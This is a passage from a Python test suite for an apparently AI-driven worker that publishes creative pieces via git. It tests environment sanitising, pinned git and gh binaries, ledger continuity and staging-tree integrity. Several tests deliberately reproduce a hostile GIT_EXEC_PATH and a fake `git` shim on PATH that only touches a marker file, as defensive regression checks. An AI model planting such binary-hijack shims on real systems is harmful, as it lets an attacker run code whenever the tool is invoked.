            env = self.fresh_env()
        expected = {"PATH", "HOME", "XDG_CONFIG_HOME", "TMPDIR",
                    "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM",
                    "GIT_CONFIG_NOSYSTEM", "GIT_TERMINAL_PROMPT",
                    "GIT_ASKPASS", "GIT_ALLOW_PROTOCOL",
                    "GIT_PROTOCOL_FROM_USER"}
        self.assertEqual(set(), set(env) - expected - set(EW.GIT_ENV_ALLOWLIST)
                         - set(EW.GIT_ENV_CERT_VARS))
        self.assertEqual("0", env["GIT_TERMINAL_PROMPT"])
        self.assertEqual("https:file", env["GIT_ALLOW_PROTOCOL"])
        self.assertEqual("/usr/bin/false", env["GIT_ASKPASS"])
        self.assertTrue(env["HOME"].endswith("git-home"))
        self.assertTrue(env["TMPDIR"].startswith(env["HOME"]))

    def test_a_relative_path_entry_is_dropped(self):
        with mock.patch.dict(os.environ, {"PATH": ".:relative:/usr/bin:/bin"}):
            env = self.fresh_env()
        self.assertNotIn(".", env["PATH"].split(os.pathsep))
        self.assertNotIn("relative", env["PATH"].split(os.pathsep))
        self.assertIn("/usr/bin", env["PATH"].split(os.pathsep))

    def test_an_unusable_path_still_finds_git(self):
        with mock.patch.dict(os.environ, {"PATH": "/nonexistent-xyz"}):
            env = self.fresh_env()
        self.assertTrue(any(os.path.exists(os.path.join(d, "git"))
                            for d in env["PATH"].split(os.pathsep)),
                        "git must remain findable")

    def test_cert_vars_are_carried_only_when_they_exist(self):
        real = self.home / "certs.pem"
        real.write_text("x", encoding="utf-8")
        with mock.patch.dict(os.environ, {"SSL_CERT_FILE": str(real)}):
            self.assertEqual(str(real), self.fresh_env()["SSL_CERT_FILE"])
        with mock.patch.dict(os.environ,
                             {"SSL_CERT_FILE": "/nope/does-not-exist.pem"}):
            self.assertNotIn("SSL_CERT_FILE", self.fresh_env())

    # ── the vector, end to end ──
    def test_the_hijack_vector_reproduces_without_the_controller(self):
        """If this ever stops firing, the test below proves nothing."""
        naive = self.home / "naive"
        proc = subprocess.run(
            ["git", "clone", "-q", str(self.origin), str(naive)],
            capture_output=True, text=True,
            env={**os.environ, "GIT_EXEC_PATH": str(self.exec_path)})
        self.assertEqual(0, proc.returncode, proc.stderr[:300])
        self.assertTrue(self.marker.exists(),
                        "GIT_EXEC_PATH no longer hijacks git-upload-pack; "
                        "the guarantee below needs a new repro")

    def test_the_initial_fetch_is_immune_to_a_hijacked_exec_path(self):
        clone = self.home / "clone"
        with mock.patch.dict(os.environ, self.hostile), \
             mock.patch.object(EW, "_CTX_CACHE", {}):
            head = EW._clone_repo(self.wcfg, clone)
        self.assertFalse(self.marker.exists(),
                         "a hostile GIT_EXEC_PATH executed during the fetch")
        self.assertEqual(git_bare(self.origin, "rev-parse", "main").strip(), head)
        self.assertTrue((clone / "submissions" / "already-here").is_dir(),
                        "canonical transport must still work")

    def test_the_sanitized_cleanup_is_immune_too(self):
        clone = self.home / "clone-cleanup"
        with mock.patch.object(EW, "_CTX_CACHE", {}):
            EW._clone_repo(self.wcfg, clone)
        git(clone, "config", "user.email", "t@example.com")
        git(clone, "config", "user.name", "t")
        git(clone, "checkout", "-q", "-b", "art/doomed")
        (clone / "x.txt").write_text("x", encoding="utf-8")
        git(clone, "add", "-A")
        git(clone, "commit", "-qm", "doomed")
        git(clone, "push", "-q", "-u", "origin", "art/doomed")
        # force the sanitized path: the clone no longer verifies
        git(clone, "config", "remote.origin.pushurl", str(self.home / "x.git"))

        with mock.patch.dict(os.environ, self.hostile), \
             mock.patch.object(EW, "_CTX_CACHE", {}):
            self.assertTrue(EW._delete_remote_branch(clone, "art/doomed",
                                                     self.wcfg))
        self.assertFalse(self.marker.exists(),
                         "the cleanup ran a hijacked git helper")
        self.assertNotIn("art/doomed",
                         git_bare(self.origin, "for-each-ref",
                                  "--format=%(refname)"))

    def test_a_full_cycle_survives_a_hostile_environment(self):
        with mock.patch.dict(os.environ, self.hostile), \
             mock.patch.object(EW, "_CTX_CACHE", {}), \
             mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertFalse(self.marker.exists())
        self.assertIn("submissions/new-piece/piece.svg",
                      git_bare(self.origin, "ls-tree", "--name-only", "-r", "main"))

    def test_the_allowlist_is_named_in_the_source_not_a_denylist(self):
        source = (Path(__file__).resolve().parent / "evolve_worker.py").read_text(
            encoding="utf-8")
        self.assertIn("GIT_ENV_ALLOWLIST", source)
        self.assertNotIn("GIT_ENV_STRIP", source,
                         "a denylist has to be complete to be correct")


class FakeGitOnPathTests(WorkerEnv):
    """An absolute, existing directory on PATH holding a fake `git` (#HIGH).

    The previous sanitiser kept any absolute existing directory, and every
    controller call invoked a bare `git` — so a hostile PATH entry chose the
    binary that everything else was busy reasoning about. The fix is to stop
    resolving git through PATH at all.
    """

    def setUp(self):
        super().setUp()
        self.marker = self.home / "FAKE-GIT-RAN"
        self.fakebin = self.home / "fakebin"
        self.fakebin.mkdir()
        fake = self.fakebin / "git"
        fake.write_text(
            f'#!/bin/sh\ntouch "{self.marker}"\nexec /usr/bin/git "$@"\n',
            encoding="utf-8")
        fake.chmod(0o755)
        # the same trick for the helper the credential path would run
        helper = self.fakebin / "git-credential-osxkeychain"
        helper.write_text(f'#!/bin/sh\ntouch "{self.marker}"\nexit 0\n',
                          encoding="utf-8")
        helper.chmod(0o755)
        self.hostile_path = {"PATH": f"{self.fakebin}:/usr/bin:/bin"}
        self.wcfg = dict(EW.worker_config({}), repo=str(self.origin))

    def fresh(self):
        return mock.patch.object(EW, "_CTX_CACHE", {})

    # ── the vector, proved to work without the controller ──
    def test_the_fake_git_wins_for_a_naive_caller(self):
        proc = subprocess.run(["git", "--version"], capture_output=True,
                              text=True, env={**os.environ, **self.hostile_path})
        self.assertEqual(0, proc.returncode)
        self.assertTrue(self.marker.exists(),
                        "the repro is broken if a bare `git` does not pick up "
                        "the fake binary")

    # ── and cannot win anywhere in the controller ──
    def test_building_the_credential_helper_uses_pinned_binaries(self):
        with mock.patch.dict(os.environ, self.hostile_path), self.fresh():
            helper = EW.credential_helper_path(None, self.home / "githome")
            EW.controller_git_env(home=self.home / "githome2")
        self.assertFalse(self.marker.exists(),
                         "building the credential path ran a fake git")
        self.assertNotIn(str(self.fakebin), helper.read_text())

    def test_initial_acquisition_uses_the_pinned_binary(self):
        clone = self.home / "clone"
        with mock.patch.dict(os.environ, self.hostile_path), self.fresh():
            head = EW._clone_repo(self.wcfg, clone)
        self.assertFalse(self.marker.exists(), "the clone ran a fake git")
        self.assertEqual(git_bare(self.origin, "rev-parse", "main").strip(), head)

    def test_a_full_cycle_uses_the_pinned_binary(self):
        with mock.patch.dict(os.environ, self.hostile_path), self.fresh(), \
             mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertFalse(self.marker.exists(), "the cycle ran a fake git")

    def test_cleanup_uses_the_pinned_binary(self):
        clone = self.home / "clone-cleanup"
        with self.fresh():
            EW._clone_repo(self.wcfg, clone)
        git(clone, "config", "user.email", "t@example.com")
        git(clone, "config", "user.name", "t")
        git(clone, "checkout", "-q", "-b", "art/doomed")
        (clone / "x.txt").write_text("x", encoding="utf-8")
        git(clone, "add", "-A")
        git(clone, "commit", "-qm", "doomed")
        git(clone, "push", "-q", "-u", "origin", "art/doomed")
        git(clone, "config", "remote.origin.pushurl", str(self.home / "x.git"))

        with mock.patch.dict(os.environ, self.hostile_path), self.fresh():
            self.assertTrue(EW._delete_remote_branch(clone, "art/doomed",
                                                     self.wcfg))
        self.assertFalse(self.marker.exists(), "the cleanup ran a fake git")
        self.assertNotIn("art/doomed",
                         git_bare(self.origin, "for-each-ref",
                                  "--format=%(refname)"))

    # ── the pin itself ──
    def test_the_pinned_binary_is_absolute_and_trusted(self):
        with mock.patch.dict(os.environ, self.hostile_path):
            binary = EW.git_binary()
        self.assertTrue(binary.startswith(("/usr/bin/", "/bin/")), binary)
        self.assertNotIn(str(self.fakebin), binary)

    def test_the_path_handed_to_git_inherits_nothing(self):
        with mock.patch.dict(os.environ, self.hostile_path), self.fresh():
            env = EW.controller_git_env()
        self.assertNotIn(str(self.fakebin), env["PATH"])
        self.assertEqual(list(EW.TRUSTED_PATH_DIRS), env["PATH"].split(os.pathsep))

    def test_a_configured_binary_outside_a_trusted_root_is_refused(self):
        with self.assertRaises(EW.GateError) as cm:
            EW.git_binary({"git_binary": str(self.fakebin / "git")})
        self.assertIn("trusted root", str(cm.exception))

    def test_a_symlink_from_a_trusted_root_to_an_untrusted_target_is_refused(self):
        link = self.home / "link-git"
        link.symlink_to(self.fakebin / "git")
        with self.assertRaises(EW.GateError):
            EW.git_binary({"git_binary": str(link)})

    def test_a_non_executable_or_writable_binary_is_refused(self):
        plain = self.home / "plain"
        plain.write_text("#!/bin/sh\n", encoding="utf-8")
        with self.assertRaises(EW.GateError):
            EW.git_binary({"git_binary": str(plain),
                           "trusted_bin_roots": [str(self.home)]})
        plain.chmod(0o777)
        with self.assertRaises(EW.GateError) as cm:
            EW.git_binary({"git_binary": str(plain),
                           "trusted_bin_roots": [str(self.home)]})
        self.assertIn("writable", str(cm.exception))

    def test_a_configured_trusted_binary_is_accepted(self):
        self.assertEqual("/usr/bin/git",
                         EW.git_binary({"git_binary": "/usr/bin/git"}))

    def test_gh_is_validated_too(self):
        # gh may live in a package-manager prefix, so the rule is "absolute,
        # regular, executable, not writable by anybody else" rather than a
        # system root — but it is still a rule.
        with self.assertRaises(EW.GateError) as cm:
            EW.gh_binary({"gh_binary": "gh"})
        self.assertIn("absolute", str(cm.exception))

        loose = self.home / "loose-gh"
        loose.write_text("#!/bin/sh\n", encoding="utf-8")
        loose.chmod(0o777)
        with self.assertRaises(EW.GateError) as cm:
            EW.gh_binary({"gh_binary": str(loose)})
        self.assertIn("writable", str(cm.exception))

        loose.chmod(0o755)
        self.assertEqual(str(loose.resolve()),
                         EW.gh_binary({"gh_binary": str(loose)}))

    def test_no_bare_git_or_gh_invocation_survives_in_the_source(self):
        source = (Path(__file__).resolve().parent / "evolve_worker.py").read_text(
            encoding="utf-8")
        self.assertNotIn('subprocess.run(["git"', source,
                         "git must be invoked through the pinned binary")
        self.assertNotIn('subprocess.run(["gh"', source,
                         "gh must be invoked through the resolved binary")


LIVE_LEGACY_STATE = {
    "cycles": [
        {"cycle": 1, "slug": "first-heartbeat-ii",
         "title": "First Heartbeat II", "at": "2026-08-17T20:11:00+00:00"},
    ],
    "last_cycle": 1,
}


class CreativeContinuityTests(unittest.TestCase):
    """The live instance's own state, read without guessing (#2)."""

    def test_the_exact_live_state_says_the_next_cycle_is_two(self):
        self.assertEqual((2, "first-heartbeat-ii"),
                         EW.next_creative_cycle(LIVE_LEGACY_STATE))

    def test_a_fresh_instance_starts_at_one(self):
        self.assertEqual((1, None), EW.next_creative_cycle({}))

    def test_the_worker_schema_still_reads_the_same_way(self):
        self.assertEqual((4, "third-thing"),
                         EW.next_creative_cycle({"cycle": 3,
                                                 "last_slug": "third-thing"}))

    def test_cycles_alone_are_enough(self):
        state = {"cycles": [{"cycle": 1, "slug": "a"}, {"cycle": 2, "slug": "b"}]}
        self.assertEqual((3, "b"), EW.next_creative_cycle(state))

    def test_last_slug_wins_over_the_history_list(self):
        state = dict(LIVE_LEGACY_STATE, last_slug="explicit")
        self.assertEqual((2, "explicit"), EW.next_creative_cycle(state))

    # ── inconsistency fails closed ──
    def test_cycle_and_last_cycle_disagreeing_fails_closed(self):
        with self.assertRaises(EW.LedgerError) as cm:
            EW.next_creative_cycle({"cycle": 1, "last_cycle": 5})
        self.assertIn("disagrees with itself", str(cm.exception))

    def test_a_history_ahead_of_the_counter_fails_closed(self):
        with self.assertRaises(EW.LedgerError) as cm:
            EW.next_creative_cycle({"last_cycle": 1,
                                    "cycles": [{"cycle": 1}, {"cycle": 2}]})
        self.assertIn("reaches 2", str(cm.exception))

    def test_a_gapped_history_fails_closed(self):
        with self.assertRaises(EW.LedgerError) as cm:
            EW.next_creative_cycle({"cycles": [{"cycle": 1}, {"cycle": 3}]})
        self.assertIn("contiguous run", str(cm.exception))

    def test_nonsense_types_fail_closed(self):
        for state in ({"cycle": "two"}, {"last_cycle": -1}, {"cycles": "many"},
                      {"cycles": [{"cycle": 0}]}, {"cycles": ["nope"]},
                      {"cycle": True}, {"last_slug": 7, "cycle": 1}):
            with self.subTest(state=state):
                with self.assertRaises(EW.LedgerError):
                    EW.next_creative_cycle(state)

    def test_an_empty_shell_of_a_state_fails_closed(self):
        with self.assertRaises(EW.LedgerError) as cm:
            EW.next_creative_cycle({"notes": "nothing else"})
        self.assertIn("no cycle", str(cm.exception))

    # ── writing preserves the legacy history ──
    def test_merging_keeps_the_legacy_cycles_and_adds_the_new_one(self):
        merged = EW.merge_creative_state(
            LIVE_LEGACY_STATE, {"notes": "learned things"}, 2, "second-thing",
            {"merge_commit": "abc123", "pr_url": "https://example/pr/2"})
        self.assertEqual([1, 2], [c["cycle"] for c in merged["cycles"]])
        self.assertEqual("first-heartbeat-ii", merged["cycles"][0]["slug"])
        self.assertEqual("second-thing", merged["cycles"][1]["slug"])
        self.assertEqual("abc123", merged["cycles"][1]["merge_commit"])
        self.assertEqual(2, merged["cycle"])
        self.assertEqual(2, merged["last_cycle"])
        self.assertEqual("second-thing", merged["last_slug"])
        self.assertEqual("learned things", merged["notes"])

    def test_the_merged_state_reads_back_as_the_next_cycle(self):
        merged = EW.merge_creative_state(LIVE_LEGACY_STATE, {}, 2, "second",
                                         {"merge_commit": "x"})
        self.assertEqual((3, "second"), EW.next_creative_cycle(merged))

    def test_a_replayed_cycle_number_does_not_duplicate_history(self):
        merged = EW.merge_creative_state(LIVE_LEGACY_STATE, {}, 1, "redone",
                                         {"merge_commit": "x"})
        self.assertEqual([1], [c["cycle"] for c in merged["cycles"]])
        self.assertEqual("redone", merged["cycles"][0]["slug"])

    def test_history_is_bounded_and_still_readable(self):
        state = {"cycles": [{"cycle": i, "slug": f"s{i}"}
                            for i in range(11, 61)],
                 "cycle": 60, "last_cycle": 60, "last_slug": "s60"}
        merged = EW.merge_creative_state(state, {}, 61, "new", {})
        self.assertEqual(EW.CREATIVE_HISTORY_LIMIT, len(merged["cycles"]))
        self.assertEqual(61, merged["cycles"][-1]["cycle"])
        self.assertEqual(12, merged["cycles"][0]["cycle"])
        self.assertEqual((62, "new"), EW.next_creative_cycle(merged),
                         "the writer must produce state the reader accepts")


class LongHorizonContinuityTests(unittest.TestCase):
    """The ledger must still be readable after the history is truncated.

    The writer kept the last 50 cycles; the reader demanded 1..N. The first
    state written after cycle 50 was therefore one the worker itself refused
    to read — an instance that bricks its own continuity at cycle 51, on a
    long-lived install, which is the worst possible place for it to surface.
    """

    LIMIT = EW.CREATIVE_HISTORY_LIMIT

    def run_cycles(self, count, state=None):
        state = dict(state or {})
        for n in range(1, count + 1):
            nxt, previous = EW.next_creative_cycle(state)
            self.assertEqual(n, nxt, f"cycle {n} computed as {nxt}")
            if n > 1:
                self.assertEqual(f"piece-{n - 1}", previous)
            state = EW.merge_creative_state(state, {"notes": f"n{n}"}, n,
                                            f"piece-{n}",
                                            {"merge_commit": f"c{n}"})
        return state

    def test_sixty_one_cycles_round_trip(self):
        state = self.run_cycles(61)
        self.assertEqual((62, "piece-61"), EW.next_creative_cycle(state))
        self.assertEqual(self.LIMIT, len(state["cycles"]))
        self.assertEqual(61, state["cycle"])
        self.assertEqual(61, state["last_cycle"])
        self.assertEqual("piece-61", state["last_slug"])

    def test_two_hundred_cycles_round_trip(self):
        state = self.run_cycles(200)
        self.assertEqual((201, "piece-200"), EW.next_creative_cycle(state))
        self.assertEqual(list(range(151, 201)),
                         [c["cycle"] for c in state["cycles"]])

    def test_the_boundary_at_fifty_is_still_a_prefix(self):
        state = self.run_cycles(self.LIMIT)
        self.assertEqual(1, state["cycles"][0]["cycle"])
        self.assertEqual(self.LIMIT, len(state["cycles"]))
        self.assertEqual((self.LIMIT + 1, f"piece-{self.LIMIT}"),
                         EW.next_creative_cycle(state))

    def test_the_boundary_at_fifty_one_becomes_a_tail(self):
        state = self.run_cycles(self.LIMIT + 1)
        self.assertEqual(2, state["cycles"][0]["cycle"],
                         "the tail drops exactly one cycle")
        self.assertEqual(self.LIMIT + 1, state["cycles"][-1]["cycle"])
        self.assertEqual((self.LIMIT + 2, f"piece-{self.LIMIT + 1}"),
                         EW.next_creative_cycle(state))

    def test_every_state_written_is_readable(self):
        state = {}
        for n in range(1, 121):
            state = EW.merge_creative_state(state, {}, n, f"p{n}",
                                            {"merge_commit": "x"})
            completed, previous = EW.creative_position(state)
            self.assertEqual(n, completed, f"unreadable after cycle {n}")
            self.assertEqual(f"p{n}", previous)

    # ── tails that cannot be trusted ──
    def tail(self, first, length, counter):
        return {"cycles": [{"cycle": c, "slug": f"p{c}"}
                           for c in range(first, first + length)],
                "cycle": counter, "last_cycle": counter}

    def test_a_tail_without_a_counter_fails_closed(self):
        state = {"cycles": [{"cycle": c, "slug": f"p{c}"}
                            for c in range(12, 62)]}
        with self.assertRaises(EW.LedgerError) as cm:
            EW.next_creative_cycle(state)
        self.assertIn("no 'cycle' or 'last_cycle'", str(cm.exception))

    def test_a_short_tail_fails_closed(self):
        with self.assertRaises(EW.LedgerError) as cm:
            EW.next_creative_cycle(self.tail(40, 10, 49))
        self.assertIn(f"exactly {self.LIMIT} long", str(cm.exception))

    def test_a_tail_that_does_not_end_at_the_counter_fails_closed(self):
        with self.assertRaises(EW.LedgerError) as cm:
            EW.next_creative_cycle(self.tail(12, self.LIMIT, 75))
        self.assertIn("ends at cycle 61", str(cm.exception))

    def test_a_tail_that_starts_in_the_wrong_place_fails_closed(self):
        state = self.tail(20, self.LIMIT, 69)
        state["cycles"] = state["cycles"][:-1] + [{"cycle": 69, "slug": "x"}]
        state["cycles"] = [{"cycle": c, "slug": f"p{c}"}
                           for c in range(20, 20 + self.LIMIT)]
        state["cycle"] = state["last_cycle"] = 70
        with self.assertRaises(EW.LedgerError):
            EW.next_creative_cycle(state)

    def test_a_gapped_history_fails_closed_either_way(self):
        for state in ({"cycles": [{"cycle": 1}, {"cycle": 3}]},
                      {"cycles": [{"cycle": 12}, {"cycle": 14}],
                       "cycle": 14, "last_cycle": 14}):
            with self.subTest(state=state):
                with self.assertRaises(EW.LedgerError) as cm:
                    EW.next_creative_cycle(state)
                self.assertIn("contiguous run", str(cm.exception))

    def test_an_out_of_order_history_fails_closed(self):
        state = {"cycles": [{"cycle": 2}, {"cycle": 1}], "cycle": 2,
                 "last_cycle": 2}
        with self.assertRaises(EW.LedgerError) as cm:
            EW.next_creative_cycle(state)
        self.assertIn("strictly ordered", str(cm.exception))

    def test_a_duplicate_cycle_fails_closed(self):
        state = {"cycles": [{"cycle": 1}, {"cycle": 1}], "cycle": 1}
        with self.assertRaises(EW.LedgerError):
            EW.next_creative_cycle(state)

    def test_a_prefix_shorter_than_the_counter_is_still_allowed(self):
        # legacy states recorded only some cycles; a prefix does not claim
        # to be the whole history the way a tail does
        self.assertEqual((6, "p2"),
                         EW.next_creative_cycle({"cycles": [{"cycle": 1, "slug": "p1"},
                                                            {"cycle": 2, "slug": "p2"}],
                                                 "last_cycle": 5}))

    def test_the_limit_is_one_constant_shared_by_reader_and_writer(self):
        merged = EW.merge_creative_state({}, {}, 1, "p1", {})
        for n in range(2, self.LIMIT + 20):
            merged = EW.merge_creative_state(merged, {}, n, f"p{n}", {})
        self.assertLessEqual(len(merged["cycles"]), self.LIMIT)
        self.assertEqual(EW.history_limit(), self.LIMIT)

    def test_a_configured_limit_is_honoured_by_both_halves(self):
        wcfg = {"creative_history_limit": 3}
        state = {}
        for n in range(1, 9):
            nxt, _ = EW.next_creative_cycle(state, wcfg)
            self.assertEqual(n, nxt)
            state = EW.merge_creative_state(state, {}, n, f"p{n}", {}, wcfg)
        self.assertEqual([6, 7, 8], [c["cycle"] for c in state["cycles"]])
        self.assertEqual((9, "p8"), EW.next_creative_cycle(state, wcfg))

    def test_a_nonpositive_configured_limit_fails_closed(self):
        with self.assertRaises(EW.LedgerError):
            EW.history_limit({"creative_history_limit": 0})


class LiveRetryTests(WorkerEnv):
    """The rejected live attempt was a failed spend, not a public cycle (#3)."""

    def setUp(self):
        super().setUp()
        (self.state / "evolve-creative-state.json").write_text(
            json.dumps(LIVE_LEGACY_STATE), encoding="utf-8")
        # the commons already holds cycle 1's piece
        seed = self.home / "seed2"
        subprocess.run(["git", "clone", str(self.origin), str(seed)],
                       check=True, capture_output=True)
        git(seed, "config", "user.email", "t@example.com")
        git(seed, "config", "user.name", "t")
        write_submission(seed, "first-heartbeat-ii",
                         meta_for("first-heartbeat-ii"))
        git(seed, "add", "-A")
        git(seed, "commit", "-qm", "cycle 1")
        git(seed, "push", "-q", "origin", "main")

    def test_the_retry_after_a_rejected_attempt_is_cycle_two(self):
        # a rejected cycle: the maker leaves a hidden probe and nothing else
        def fumbling(staging, prompt, wcfg, depth=0, runtime=None):
            (Path(staging) / "out" / EW.SUBMISSION_DIR / ".probe").write_text(
                "", encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"
        with mock.patch.object(EW, "run_model", fumbling):
            first = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, first["outcome"])

        state = json.loads(
            (self.state / "evolve-creative-state.json").read_text())
        self.assertEqual(LIVE_LEGACY_STATE, state,
                         "a failed spend must not touch public continuity")

        seen = {}

        def maker(staging, prompt, wcfg, depth=0, runtime=None):
            seen["prompt"] = prompt
            write_submission(Path(staging) / "out", "second-piece",
                             meta_for("second-piece", cycle=2,
                                      previous="first-heartbeat-ii"))
            (Path(staging) / "state-out.json").write_text(json.dumps(
                {"cycle": 2, "last_slug": "second-piece", "notes": "n"}),
                encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"

        with mock.patch.object(EW, "run_model", maker):
            second = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_CONTRIBUTED, second["outcome"], second)
        self.assertIn('"cycle" MUST be exactly 2', seen["prompt"])
        self.assertIn("first-heartbeat-ii", seen["prompt"])
        merged = json.loads(
            (self.state / "evolve-creative-state.json").read_text())
        self.assertEqual(2, merged["cycle"])
        self.assertEqual("second-piece", merged["last_slug"])
        self.assertEqual([1, 2], [c["cycle"] for c in merged["cycles"]],
                         "the legacy history survived the write")

    def test_a_cycle_one_retry_against_the_live_state_is_rejected(self):
        def stale(staging, prompt, wcfg, depth=0, runtime=None):
            write_submission(Path(staging) / "out", "another-first",
                             meta_for("another-first", cycle=1, previous=None))
            (Path(staging) / "state-out.json").write_text(json.dumps(
                {"cycle": 1, "last_slug": "another-first"}), encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"
        with mock.patch.object(EW, "run_model", stale):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("continuity", summary["detail"])

    def test_an_inconsistent_state_stops_the_pass_before_any_model(self):
        (self.state / "evolve-creative-state.json").write_text(
            json.dumps({"cycle": 1, "last_cycle": 9}), encoding="utf-8")
        with mock.patch.object(EW, "run_model") as maker:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("fail-closed", summary["outcome"])
        maker.assert_not_called()

    def test_reconciliation_writes_the_migrated_shape(self):
        real_publish = EW.publish

        def dying(clone, submission, wcfg, health, branch=None,
                  transaction=None, ctx=None, profile_snapshot=None):
            def note(**fields):
                state = transaction(**fields) if transaction else {}
                if fields.get("phase") == "merged":
                    raise KeyboardInterrupt("power cut")
                return state
            return real_publish(clone, submission, wcfg, health, branch, note,
                                ctx, profile_snapshot)

        def maker(staging, prompt, wcfg, depth=0, runtime=None):
            write_submission(Path(staging) / "out", "second-piece",
                             meta_for("second-piece", cycle=2,
                                      previous="first-heartbeat-ii"))
            (Path(staging) / "state-out.json").write_text(json.dumps(
                {"cycle": 2, "last_slug": "second-piece"}), encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"

        with mock.patch.object(EW, "run_model", maker), \
             mock.patch.object(EW, "publish", dying):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        with mock.patch.object(EW, "run_model") as unused:
            healed = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        unused.assert_not_called()
        self.assertEqual("reconciled-contributed", healed["outcome"], healed)

        merged = json.loads(
            (self.state / "evolve-creative-state.json").read_text())
        self.assertEqual(2, merged["cycle"])
        self.assertEqual([1, 2], [c["cycle"] for c in merged["cycles"]])
        self.assertEqual((3, "second-piece"), EW.next_creative_cycle(merged))


class StagingTreeIntegrityTests(ScratchCase):
    """The WHOLE staging tree, not just the corner the submission lives in."""

    def setUp(self):
        super().setUp()
        self.staging = self.home / "staging"
        self.out = EW.prepare_staging(self.staging)
        (self.staging / "context" / "prior.json").write_text(
            '[{"slug": "already-here"}]', encoding="utf-8")
        (self.staging / "state-in.json").write_text('{"cycle": 1}',
                                                    encoding="utf-8")
        (self.staging / "round1.json").write_text("[]", encoding="utf-8")
        self.baseline = EW.staging_manifest(self.staging)

    def leave_valid_output(self):
        (self.out / "meta.json").write_text(
            json.dumps(meta_for("new-piece")), encoding="utf-8")
        (self.out / "piece.svg").write_text(SVG, encoding="utf-8")
        (self.staging / "state-out.json").write_text(
            '{"cycle": 1, "last_slug": "new-piece"}', encoding="utf-8")

    def verify(self):
        return EW.verify_staging_tree(self.staging, self.baseline,
                                      EW.worker_config({}))

    # ── what must pass ──
    def test_the_valid_no_shell_output_passes(self):
        self.leave_valid_output()
        self.assertEqual("piece.svg", self.verify())

    def test_an_empty_run_passes_the_tree_check(self):
        self.assertEqual("", self.verify(), "a decline leaves nothing behind")

    def test_each_supported_extension_is_accepted(self):
        for ext in sorted(EW.KIND_EXTENSIONS.values()):
            with self.subTest(ext=ext):
                for stale in self.out.iterdir():
                    stale.unlink()
                (self.out / "meta.json").write_text("{}", encoding="utf-8")
                (self.out / f"piece{ext}").write_text("x", encoding="utf-8")
                self.assertEqual(f"piece{ext}", self.verify())

    # ── the repro from the review ──
    def test_a_draft_left_at_the_staging_root_is_rejected(self):
        self.leave_valid_output()
        (self.staging / "draft.txt").write_text("some notes", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.verify()
        self.assertIn("draft.txt", str(cm.exception))
        self.assertIn("not part of a submission", str(cm.exception))

    def test_a_hidden_file_at_the_staging_root_is_rejected(self):
        self.leave_valid_output()
        (self.staging / ".secret").write_text("x", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.verify()
        self.assertIn("hidden file", str(cm.exception))

    def test_a_new_directory_anywhere_is_rejected(self):
        self.leave_valid_output()
        (self.staging / "scratch").mkdir()
        with self.assertRaises(EW.GateError) as cm:
            self.verify()
        self.assertIn("created the directory", str(cm.exception))

    def test_a_nested_file_under_a_new_directory_is_rejected(self):
        self.leave_valid_output()
        (self.staging / "work").mkdir()
        (self.staging / "work" / "notes.md").write_text("x", encoding="utf-8")
        with self.assertRaises(EW.GateError):
            self.verify()

    def test_a_second_copy_of_the_piece_elsewhere_is_rejected(self):
        self.leave_valid_output()
        (self.staging / "context" / "piece.svg").write_text(SVG, encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.verify()
        self.assertIn("context/piece.svg", str(cm.exception))

    def test_two_pieces_in_the_output_are_rejected(self):
        self.leave_valid_output()
        (self.out / "piece.md").write_text("x", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.verify()
        self.assertIn("more than one piece", str(cm.exception))

    # ── context must survive untouched ──
    def test_mutating_the_context_is_rejected(self):
        self.leave_valid_output()
        (self.staging / "context" / "prior.json").write_text(
            '[{"slug": "invented"}]', encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.verify()
        self.assertIn("modified context/prior.json", str(cm.exception))

    def test_deleting_the_context_is_rejected(self):
        self.leave_valid_output()
        (self.staging / "context" / "prior.json").unlink()
        with self.assertRaises(EW.GateError) as cm:
            self.verify()
        self.assertIn("deleted context/prior.json", str(cm.exception))

    def test_rewriting_the_finalists_is_rejected(self):
        self.leave_valid_output()
        (self.staging / "round1.json").write_text('[{"id": "mine"}]',
                                                  encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            self.verify()
        self.assertIn("round1.json", str(cm.exception))

    def test_deleting_a_prepared_directory_is_rejected(self):
        self.leave_valid_output()
        shutil.rmtree(self.staging / "context")
        with self.assertRaises(EW.GateError) as cm:
            self.verify()
        self.assertIn("deleted", str(cm.exception))

    def test_a_mode_change_on_context_is_rejected(self):
        self.leave_valid_output()
        os.chmod(self.staging / "state-in.json", 0o777)
        with self.assertRaises(EW.GateError) as cm:
            self.verify()
        self.assertIn("changed mode", str(cm.exception))

    def test_a_symlink_anywhere_is_rejected(self):
        self.leave_valid_output()
        (self.staging / "link").symlink_to(self.home)
        with self.assertRaises(EW.GateError) as cm:
            self.verify()
        self.assertIn("symlink", str(cm.exception))

    def test_replacing_a_context_file_with_a_directory_is_rejected(self):
        self.leave_valid_output()
        (self.staging / "state-in.json").unlink()
        (self.staging / "state-in.json").mkdir()
        with self.assertRaises(EW.GateError) as cm:
            self.verify()
        self.assertIn("changed from file to dir", str(cm.exception))

    def test_a_prepared_tree_with_a_symlink_is_refused_at_baseline(self):
        (self.staging / "sneaky").symlink_to(self.home)
